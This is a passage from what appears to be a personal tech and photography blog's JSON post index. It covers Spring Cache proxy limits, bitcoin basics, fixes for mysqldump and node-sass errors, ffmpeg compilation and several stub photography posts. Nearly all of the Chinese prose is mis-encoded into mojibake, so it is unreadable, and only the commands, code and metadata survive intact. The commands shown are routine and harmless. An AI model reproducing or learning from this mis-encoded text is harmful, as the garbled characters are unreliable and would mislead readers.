fooï¼ˆï¼‰æ–¹æ³•çš„æ—¶å€™ï¼Œç»™ä»–çš„ä¸æ˜¯ pojo è‡ªèº«çš„å¼•ç”¨ï¼Œè€Œæ˜¯ä¸€ä¸ªåŠ¨æ€ç”Ÿæˆçš„ä»£ç†ç±»å›¾ 3. åŠ¨æ€ä»£ç†è°ƒç”¨å›¾å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå®é™…å®¢æˆ·ç«¯æ‹¥æœ‰çš„æ˜¯ä¸€ä¸ªä»£ç†çš„å¼•ç”¨ï¼Œé‚£ä¹ˆåœ¨è°ƒç”¨ foo() æ–¹æ³•çš„æ—¶å€™ï¼Œä¼šé¦–å…ˆè°ƒç”¨ proxy çš„ foo() æ–¹æ³•ï¼Œè¿™ä¸ªæ—¶å€™ proxy å¯ä»¥æ•´ä½“æ§åˆ¶å®é™…çš„ pojo.foo() æ–¹æ³•çš„å…¥å‚å’Œè¿”å›å€¼ï¼Œæ¯”å¦‚ç¼“å­˜ç»“æœï¼Œæ¯”å¦‚ç›´æ¥ç•¥è¿‡æ‰§è¡Œå®é™…çš„ foo() æ–¹æ³•ç­‰ï¼Œéƒ½æ˜¯å¯ä»¥è½»æ¾åšåˆ°çš„ã€‚æ³¨æ„å’Œé™åˆ¶åŸºäº proxy çš„ spring aop å¸¦æ¥çš„å†…éƒ¨è°ƒç”¨é—®é¢˜ä¸Šé¢ä»‹ç»è¿‡ spring cache çš„åŸç†ï¼Œå³å®ƒæ˜¯åŸºäºåŠ¨æ€ç”Ÿæˆçš„ proxy ä»£ç†æœºåˆ¶æ¥å¯¹æ–¹æ³•çš„è°ƒç”¨è¿›è¡Œåˆ‡é¢ï¼Œè¿™é‡Œå…³é”®ç‚¹æ˜¯å¯¹è±¡çš„å¼•ç”¨é—®é¢˜ï¼Œå¦‚æœå¯¹è±¡çš„æ–¹æ³•æ˜¯å†…éƒ¨è°ƒç”¨ï¼ˆå³ this å¼•ç”¨ï¼‰è€Œä¸æ˜¯å¤–éƒ¨å¼•ç”¨ï¼Œåˆ™ä¼šå¯¼è‡´ proxy å¤±æ•ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„åˆ‡é¢å°±å¤±æ•ˆï¼Œä¹Ÿå°±æ˜¯è¯´ä¸Šé¢å®šä¹‰çš„å„ç§æ³¨é‡ŠåŒ…æ‹¬ @Cacheableã€@CachePut å’Œ @CacheEvict éƒ½ä¼šå¤±æ•ˆã€‚è¦é¿å…è¿™ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¦é¿å…å¯¹ç¼“å­˜æ–¹æ³•çš„å†…éƒ¨è°ƒç”¨ï¼Œæˆ–è€…é¿å…ä½¿ç”¨åŸºäº proxy çš„ AOP æ¨¡å¼ï¼Œå¯ä»¥ä½¿ç”¨åŸºäº aspectJ çš„ AOP æ¨¡å¼æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚@CacheEvict çš„å¯é æ€§é—®é¢˜ @CacheEvict æ³¨é‡Šæœ‰ä¸€ä¸ªå±æ€§ beforeInvocationï¼Œç¼ºçœä¸º falseï¼Œå³ç¼ºçœæƒ…å†µä¸‹ï¼Œéƒ½æ˜¯åœ¨å®é™…çš„æ–¹æ³•æ‰§è¡Œå®Œæˆåï¼Œæ‰å¯¹ç¼“å­˜è¿›è¡Œæ¸…ç©ºæ“ä½œã€‚æœŸé—´å¦‚æœæ‰§è¡Œæ–¹æ³•å‡ºç°å¼‚å¸¸ï¼Œåˆ™ä¼šå¯¼è‡´ç¼“å­˜æ¸…ç©ºä¸è¢«æ‰§è¡Œã€‚æˆ‘ä»¬å¯ä»¥ç”¨ @CacheEvict æ³¨é‡Šæä¾›çš„ beforeInvocation å±æ€§ï¼Œå°†å…¶è®¾ç½®ä¸º trueï¼Œè¿™æ ·ï¼Œåœ¨æ–¹æ³•æ‰§è¡Œå‰æˆ‘ä»¬çš„ç¼“å­˜å°±è¢«æ¸…ç©ºäº†ã€‚å¯ä»¥ç¡®ä¿ç¼“å­˜è¢«æ¸…ç©ºã€‚é public æ–¹æ³•é—®é¢˜å’Œå†…éƒ¨è°ƒç”¨é—®é¢˜ç±»ä¼¼ï¼Œé public æ–¹æ³•å¦‚æœæƒ³å®ç°åŸºäºæ³¨é‡Šçš„ç¼“å­˜ï¼Œå¿…é¡»é‡‡ç”¨åŸºäº AspectJ çš„ AOP æœºåˆ¶ã€‚æ‘‡æ»šç å†œ å…¬ä¼—å·","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"baipeng"},{"title":"æ¯”ç‰¹å¸åŸºç¡€çŸ¥è¯†","slug":"history/tech/5ade8b4d1b1af27876b353b0","date":"2018-04-24T01:41:33.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ade8b4d1b1af27876b353b0/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ade8b4d1b1af27876b353b0/","excerpt":"","text":"ç®—åŠ›: 10T 10çš„ 13æ¬¡æ–¹ï¼Œhashç¢°æ’å°±æ˜¯ç®—åŠ›çš„ä»£è¡¨powï¼šå·¥ä½œé‡è¯æ˜posï¼šæƒç›Šè¯æ˜(æŒæœ‰çš„è¶Šå¤šï¼Œè·å¾—è®°è´¦çš„æ¦‚ç‡å°±è¶Šå¤§)æ€»é‡ï¼š 2100ä¸‡æšï¼Œå¹³å‡æ¯ååˆ†é’Ÿäº§ç”Ÿä¸€ä¸ªåŒºå—ï¼Œï¼Œæ¯åŒºå—äº§ç”Ÿ50æšè´§å¸ï¼Œæ¯å‘è¡Œ21ä¸‡ä¸ªå‡åŠï¼Œ 21ä¸‡/10min = 1458.3 å¤© = 3.99 å¹´ï¼Œåˆ° 2140 å¹´å‘è¡Œå®Œæ¯•ã€‚æœ€è¿‘çš„ä¸€æ¬¡å‡åŠæ˜¯ 2016å¹´7æœˆ8å·(ç¬¬äºŒæ¬¡å‡åŠ)ï¼Œå˜æˆäº† 12.5æšã€‚è®°è´¦ï¼šè°è®¡ç®—å‡ºæ•°å­¦éš¾é¢˜è°è®°è´¦ï¼Œå¹¶è·å¾—æ–°äº§ç”Ÿçš„å¸ä»¥åŠåŒºå—ä¸­çš„äº¤æ˜“æ‰‹ç»­è´¹(ç°åœ¨ä¸º12.5ä¸ª)ï¼Œæ‰‹ç»­è´¹çº¦ä¸º é›¶ç‚¹å‡ ä¸ªåˆ°ä¸¤ä¸ªã€‚åŒºå—ä¸­åŒ…å«ä¸¤ç§ä¿¡æ¯: åŒºå—èº«ä»½ä¿¡æ¯ï¼š åŒºå—çš„å¤§å° åŒºå—çš„è¯ç”Ÿæ—¶é—´ åŒºå—çš„å“ˆå¸Œ åŒºå—çš„ç¼–å· ç½‘ç»œä¸­çš„äº¤æ˜“ æ¯ä¸ªåŒºå— çº¦ 1MBï¼Œ å¯ä»¥å­˜å‚¨ ä¸€åƒç¬”äº¤æ˜“æ¯ä¸ªæ¯”ç‰¹å¸å¯ä»¥åˆ†å‰²åˆ°å°æ•°ç‚¹åå…«ä½UTXO: unspect transaction outputså…¨ç½‘ç®—åŠ›ï¼š çº¦ 8E å“ˆå¸Œæ¯ç§’ï¼Œ 8 * 10 çš„ 18 æ¬¡æ–¹ 1E = 1000p 1p = 1000T 2009.1.3 ä¸­æœ¬èªæŒ–å‡ºç¬¬ä¸€æšæ¯”ç‰¹å¸2009.10.5 æ–°è‡ªç”±æ ‡å‡†çš„ç”¨æˆ·å‘å¸ƒæ¯”ç‰¹å¸è®¡ç®—æ ‡å‡†51% æ”»å‡»éœ€è¦çº¦ 40ä¸‡å°è®¾å¤‡ï¼Œ 40ä¸‡å° * 1ä¸‡/å° = 40äº¿2009å¹´1æœˆ3æ—¥ï¼Œä¸­æœ¬èªæŒ–å‘å‡ºæ¥ç¬¬ä¸€æšæ¯”ç‰¹å¸çš„æ—¶å€™ï¼Œæ¯”ç‰¹å¸è¿˜æ²¡æœ‰ä»·æ ¼ï¼Œæ‰€ä»¥ç¬¬ä¸€æšæ¯”ç‰¹å¸çš„ä»·æ ¼æ˜¯é›¶å…ƒã€‚2009å¹´10æœˆ5æ—¥ï¼Œä¸€ä¸ªå«åšæ–°è‡ªç”±æ ‡å‡†çš„ç”¨æˆ·ï¼Œåœ¨ä¸€ä¸ªæ¯”ç‰¹å¸æ—©æœŸè®ºå›é‡Œï¼Œå‘å¸ƒæ¯”ç‰¹å¸ä»·æ ¼è®¡ç®—çš„æ–¹æ³•ã€‚ä»–è®¤ä¸ºä¸€ä¸ªæ¯”ç‰¹å¸çš„ä»·å€¼è®¡ç®—æ–¹æ³•æ˜¯ï¼šè®¡ç®—æœºè¿è¡Œä¸€å¹´ï¼Œæ‰€éœ€è¦çš„å¹³å‡ç”µé‡å¤§æ¦‚æ˜¯1331.5åƒç“¦/æ—¶ï¼Œä¹˜ä»¥ä¸Šå¹´åº¦ç¾å›½å±…æ°‘å¹³å‡ç”¨ç”µçš„æˆæœ¬0.136ç¾å…ƒï¼Œé™¤ä»¥12ä¸ªæœˆï¼Œé™¤ä»¥è¿‡å»ä¸‰å¤©é‡Œäº§ç”Ÿçš„æ¯”ç‰¹å¸çš„æ•°é‡æœ€åçš„ç»“æœå†é™¤ä»¥1ç¾å…ƒã€‚è®¡ç®—å¾—å‡º1ç¾å…ƒç­‰äº1309.03ä¸ªæ¯”ç‰¹å¸ã€‚æ–°è‡ªç”±æ ‡å‡†çš„ç”¨æˆ·è¿˜æå‡ºäººä»¬éœ€è¦ä¸€ä¸ªå¯ä»¥çœŸæ­£ç”¨æ¯”ç‰¹å¸æ¥è¿›è¡Œäº¤æ˜“çš„ç½‘ç«™ï¼Œè¿™ä¸ªå»ºè®®å—åˆ°äº†è®ºå›åˆ›å§‹äººçš„æ”¯æŒï¼Œç»™äº†ä»–5050ä¸ªæ¯”ç‰¹å¸ï¼Œä»–ä¹Ÿç»™ç‰ˆä¸»åœ¨çº¿æ”¯ä»˜çš„5.02ç¾å…ƒï¼Œè¿™æ˜¯æœ€æ—©çš„æœ‰è®°å½•çš„æ¯”ç‰¹å¸ä»·æ ¼ã€‚ä¸çŸ¿æ± åˆä½œæ¨¡å¼PPS: å›ºå®šæŠ•å…¥ï¼Œ å›ºå®šæ”¶ç›Šæ¨¡å¼ï¼ŒçŸ¿æ± é¢„æ”¯æ”¶å…¥ç»™çŸ¿å·¥PPLNS: å›ºå®šæŠ•å…¥ï¼ŒåŠ¨æ€æ”¶å…¥ã€‚æ ¹æ®è¿‡å»æ¯ä¸ªäººç®—åŠ›å çš„è‚¡ä»½ï¼Œè¿æ°”çš„å¥½åï¼ŒåŠ¨æ€è·å–æ”¶ç›Šã€‚æ¯”ç‰¹å¸çš„äº¤æ˜“ åœºå†…äº¤æ˜“ åœºå¤–äº¤æ˜“ æ³•å¸äº¤æ˜“ å¸å¸äº¤æ˜“ Pç½‘ï¼ŒBç½‘ äº¤æ˜“å¯¹ å¸‚åœºæ·±åº¦ å’Œ å¸‚åœºæµåŠ¨æ€§é’±åŒ…åˆ†ç±» å…¨èŠ‚ç‚¹é’±åŒ… è½»é’±åŒ… ä¸­å¿ƒé’±åŒ… ç¡¬ä»¶é’±åŒ… å®‰å…¨æœºåˆ¶ å¤šé‡ç­¾åæŠ€æœ¯ åŒºå—é“¾åŒ…å«ä¿¡æ¯äº¤æ˜“ä¿¡æ¯ï¼š è½¬è´¦ä¿¡æ¯è§è¯ä¿¡æ¯ï¼šæŸèŠ‚ç‚¹åœ¨æŸäº‹ä»¶éªŒè¯äº¤æ˜“ä¿¡æ¯çš„å¯é æ€§çš„ä¿¡æ¯åŒºå—é“¾æ‰©å®¹æ–¹æ¡ˆé—ªç”µç½‘ç»œå°†è§è¯ä¿¡æ¯æ”¾åœ¨åŒºå—ä¹‹å¤–åŒºå—é“¾æœ¬èº«æ‰©å®¹ BIP141 bitcoin core å›¢é˜Ÿæå‡º UASF é€šè¿‡BIP148 ç”±ç”¨æˆ·æ¿€æ´»ï¼Œ å®ç°BIP141 SwgWit2X é€šè¿‡ BIP91 ç”±ç”¨æˆ·æ¿€æ´»","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"mysql 1044 é”™è¯¯","slug":"history/tech/5ad83a1e1b1af27876b353af","date":"2018-04-18T18:41:34.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ad83a1e1b1af27876b353af/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ad83a1e1b1af27876b353af/","excerpt":"","text":"æŠ¥é”™ä¿¡æ¯:1Got error: 1044: Access denied for user &apos;xxx&apos;@&apos;localhost&apos; to database ..... when using LOCK TABLES,è§£å†³åŠæ³•ï¼šä½¿ç”¨ mysqldump çš„é€‰é¡¹ `-skip-lock-tables`","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"windows ä¸‹å®‰è£… npm åŒ… node-sass æŠ¥é”™ error MSB3428","slug":"history/tech/5ad0d6181b1af27876b353ae","date":"2018-04-14T04:08:56.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ad0d6181b1af27876b353ae/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ad0d6181b1af27876b353ae/","excerpt":"","text":"é”™è¯¯ä¿¡æ¯:123MSBUILD : error MSB3428: æœªèƒ½åŠ è½½ Visual C++ ç»„ä»¶â€œVCBuild.exeâ€ã€‚è¦è§£å†³æ­¤é—®é¢˜ï¼Œ1) å®‰è£… .NET Framework 2.0 SDKï¼›2) å®‰è£… Microsoft Visual Studio 2005ï¼›æˆ– 3) å¦‚æœå°†è¯¥ç»„ä»¶å®‰è£…åˆ°äº†å…¶ä»–ä½ç½®ï¼Œè¯·å°†å…¶ä½ç½®æ·»åŠ åˆ°ç³»ç»Ÿè·¯å¾„ä¸­ã€‚ [C:\\Users\\Administrator\\Desktop\\richard\\console\\node_modules\\node-sass\\build\\binding.sln]é”™è¯¯åŸå› :ç¼ºå°‘ windows æ„å»ºå·¥å…· è§£å†³æ–¹æ¡ˆä¸€:1npm install --global --production windows-build-toolsç»è¿‡å°è¯•å¤±è´¥è§£å†³æ–¹æ¡ˆäºŒ:1npm i node-sass --sass_binary_site=https://npm.taobao.org/mirrors/node-sass/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"ansible debug","slug":"history/tech/5ab8748fe153c7b8335456f3","date":"2018-03-26T04:18:23.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ab8748fe153c7b8335456f3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ab8748fe153c7b8335456f3/","excerpt":"","text":"1ansible localhost -m debug -a &apos;var=groups&apos;","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"UV/DAU åŒºåˆ«","slug":"history/operate/5ab8579ce153c7b8335456f2","date":"2018-03-26T02:14:52.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/operate/5ab8579ce153c7b8335456f2/","link":"","permalink":"https://wangxiuwen.github.io/history/operate/5ab8579ce153c7b8335456f2/","excerpt":"","text":"DAU: Daily Active User æ—¥æ´»è·ƒç”¨æˆ·UV: Unique Visitor ç‹¬ç«‹æ¸¸å®¢DAUæ˜¯æ—¥æ´»è·ƒç”¨æˆ·æ•°ï¼Œé€šè¿‡ç”¨æˆ·IDæ’é‡ç»Ÿè®¡æ•°æ®ã€‚UVæ˜¯ç‹¬ç«‹è®¿å®¢ï¼Œé€šè¿‡ç”¨æˆ·IPæ’é‡ç»Ÿè®¡æ•°æ®ã€‚","categories":[{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/categories/%E8%BF%90%E8%90%A5/"}],"tags":[{"name":"operate","slug":"operate","permalink":"https://wangxiuwen.github.io/tags/operate/"},{"name":"è¿è¥","slug":"è¿è¥","permalink":"https://wangxiuwen.github.io/tags/%E8%BF%90%E8%90%A5/"}],"author":"wangxiuwen"},{"title":"python * æ“ä½œç¬¦","slug":"history/tech/5ab0e284e153c7b8335456f1","date":"2018-03-19T22:29:24.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5ab0e284e153c7b8335456f1/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5ab0e284e153c7b8335456f1/","excerpt":"","text":"12&gt;&gt;&gt; [1,2,3]* 2[1, 2, 3, 1, 2, 3]123456&gt;&gt;&gt; import numpy as np&gt;&gt;&gt; a = np.array([1])&gt;&gt;&gt; aarray([1])&gt;&gt;&gt; a *2array([2])","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"å…¬å¼æµ‹è¯•","slug":"history/math/5aab23a858d5fa35109c3f92","date":"2018-03-16T01:53:44.000Z","updated":"2020-11-29T01:42:08.743Z","comments":true,"path":"history/math/5aab23a858d5fa35109c3f92/","link":"","permalink":"https://wangxiuwen.github.io/history/math/5aab23a858d5fa35109c3f92/","excerpt":"","text":"x \\href{why-equal.html}{=} y^2 + 1","categories":[{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/categories/%E6%95%B0%E5%AD%A6/"}],"tags":[{"name":"math","slug":"math","permalink":"https://wangxiuwen.github.io/tags/math/"},{"name":"æ•°å­¦","slug":"æ•°å­¦","permalink":"https://wangxiuwen.github.io/tags/%E6%95%B0%E5%AD%A6/"}],"author":"wangxiuwen"},{"title":"æ˜Ÿè½¨æ‹æ‘„å‚æ•°","slug":"history/shoot/5aa64f5c58d5fa35109c3f91","date":"2018-03-11T21:58:52.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5aa64f5c58d5fa35109c3f91/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5aa64f5c58d5fa35109c3f91/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ˜Ÿé‡æ‹æ‘„å‚æ•°","slug":"history/shoot/5aa64f3a58d5fa35109c3f90","date":"2018-03-11T21:58:18.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5aa64f3a58d5fa35109c3f90/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5aa64f3a58d5fa35109c3f90/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"é—ªç”µæ‹æ‘„å‚æ•°","slug":"history/shoot/5aa63fe1e75a3f22318e9da8","date":"2018-03-11T20:52:49.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5aa63fe1e75a3f22318e9da8/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5aa63fe1e75a3f22318e9da8/","excerpt":"","text":"","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"æ¹¿ç‰ˆæ‘„å½±æ³•","slug":"history/shoot/5aa0f50ae75a3f22318e9da7","date":"2018-03-07T20:32:10.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5aa0f50ae75a3f22318e9da7/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5aa0f50ae75a3f22318e9da7/","excerpt":"","text":"æ¹¿ç‰ˆæ‘„å½±æ³•","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"äººåƒ","slug":"history/shoot/5aa0c94ae75a3f22318e9da6","date":"2018-03-07T17:25:30.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5aa0c94ae75a3f22318e9da6/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5aa0c94ae75a3f22318e9da6/","excerpt":"","text":"é«˜è°ƒäººåƒ ä½è°ƒäººåƒ æµªæ¼«å”¯ç¾ æ—¶å°šæ‘„å½± é«˜è´µå…¸é›… å¤å¤ é¢“åºŸå¿§ä¼¤ çºªå®æ‘„å½± æŠ½è±¡","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"ffmpeg å®‰è£…","slug":"history/tech/5a9fa44fe75a3f22318e9da5","date":"2018-03-06T20:35:27.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a9fa44fe75a3f22318e9da5/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a9fa44fe75a3f22318e9da5/","excerpt":"","text":"ç¼–è¯‘å®‰è£… SDLç¼–è¯‘å®‰è£…åæ²¡æœ‰ ffplayï¼Œæ‰€ä»¥éœ€è¦å…ˆç¼–è¯‘å®‰è£… SDLä¸‹è½½ï¼šhttp://www.libsdl.org/download-2.0.phpå®‰è£…ä¾èµ–ï¼š1sudo yum install -y libXext-develç¼–è¯‘å®‰è£…ï¼š123./configuremakemake install å®‰è£… ffmpeg ä¾èµ–:12sudo apt install -y yasm# sudo yum install -y yasm ç¼–è¯‘ ffmpeg:12345tar -xjvf ffmpeg-4.1.tar.bz2cd ffmpeg-4.1./configure --enable-shared --prefix=/usr/local/ffmpeg makemake installæ·»åŠ åº“ï¼š123vim /etc/ld.so.conf+/usr/local/ffmpeg/libsudo ldconfigæ·»åŠ ç¯å¢ƒå˜é‡:12vim /etc/profile+ export PATH=/usr/local/ffmpeg/bin:$PATHä½¿ç”¨ ffmpeg ä¸‹è½½:1ffmpeg -i http://xxx.m3u8 xxx.mp4èµ„æºï¼šhttp://ffmpeg.org/SDL æ•™ç¨‹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"}],"author":"wangxiuwen"},{"title":"äººåƒæ‘„å½±","slug":"history/shoot/5a9f9238e75a3f22318e9da4","date":"2018-03-06T19:18:16.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a9f9238e75a3f22318e9da4/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a9f9238e75a3f22318e9da4/","excerpt":"","text":"äººåƒæ‘„å½±çš„æ„å›¾(å¯æˆªæ–­ä½ç½®)","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"é©¬æ ¼å—å›¾ç‰‡ç¤¾","slug":"history/shoot/5a9f888fe75a3f22318e9da3","date":"2018-03-06T18:37:03.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a9f888fe75a3f22318e9da3/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a9f888fe75a3f22318e9da3/","excerpt":"","text":"https://www.magnumphotos.com/è‘—åæ‘„å½±å¸ˆæœ‰:ç½—ä¼¯ç‰¹Â·å¡å¸•ï¼Œå¸ƒåˆ—æ¾ï¼Œä¹”æ²»Â·ç½—æ° ï¼Œå¤§å«Â·è¥¿è’™ ï¼Œé©¬å…‹Â·å•å¸ƒ","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"é«˜è°ƒæ‘„å½±/ç°è°ƒæ‘„å½±/ä½è°ƒæ‘„å½±","slug":"history/shoot/5a96258cf5087a54058a83d0","date":"2018-02-28T03:44:12.000Z","updated":"2020-11-29T01:42:08.747Z","comments":true,"path":"history/shoot/5a96258cf5087a54058a83d0/","link":"","permalink":"https://wangxiuwen.github.io/history/shoot/5a96258cf5087a54058a83d0/","excerpt":"","text":"é«˜è°ƒæ‘„å½± ä½è°ƒæ‘„å½±","categories":[{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/categories/%E6%91%84%E5%BD%B1/"}],"tags":[{"name":"shoot","slug":"shoot","permalink":"https://wangxiuwen.github.io/tags/shoot/"},{"name":"æ‘„å½±","slug":"æ‘„å½±","permalink":"https://wangxiuwen.github.io/tags/%E6%91%84%E5%BD%B1/"}],"author":"wangxiuwen"},{"title":"Spring Boot2.0 æ–°ç‰¹æ€§","slug":"history/tech/5a96561af5087a54058a83d3","date":"2018-02-27T19:11:22.000Z","updated":"2020-11-29T01:42:08.767Z","comments":true,"path":"history/tech/5a96561af5087a54058a83d3/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5a96561af5087a54058a83d3/","excerpt":"","text":"ä»¥Java 8 ä¸ºåŸºå‡†Spring Boot 2.0 è¦æ±‚Java ç‰ˆæœ¬å¿…é¡»8ä»¥ä¸Šï¼Œ Java 6 å’Œ 7 ä¸å†æ”¯æŒã€‚å†…åµŒå®¹å™¨åŒ…ç»“æ„è°ƒæ•´ä¸ºäº†æ”¯æŒreactiveä½¿ç”¨åœºæ™¯ï¼Œå†…åµŒçš„å®¹å™¨åŒ…ç»“æ„è¢«é‡æ„äº†çš„å¹…åº¦æœ‰ç‚¹å¤§ã€‚EmbeddedServletContainerè¢«é‡å‘½åä¸ºWebServerï¼Œå¹¶ä¸”org.springframework.boot.context.embedded åŒ…è¢«é‡å®šå‘åˆ°äº†org.springframework.boot.web.embeddedåŒ…ä¸‹ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œå¦‚æœä½ 